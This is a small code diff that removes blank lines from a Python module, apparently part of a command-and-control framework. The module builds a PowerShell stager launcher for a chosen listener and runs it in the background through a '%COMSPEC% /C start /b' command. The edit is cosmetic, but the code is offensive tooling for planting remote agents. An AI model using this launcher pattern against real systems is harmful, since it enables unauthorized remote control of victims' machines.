@@ -16,7 +16,6 @@ class Module(object):
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-
         # staging options
         listener_name = params["Listener"]
         command = params["Command"]
@@ -56,7 +55,6 @@ class Module(object):
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
         elif listener_name:
-
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
                 listenerName=listener_name,
@@ -73,7 +71,6 @@ class Module(object):
             if launcher == "":
                 return handle_error_message("[!] Error in launcher generation.")
             else:
-
                 Cmd = (
                     "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                     + launcher
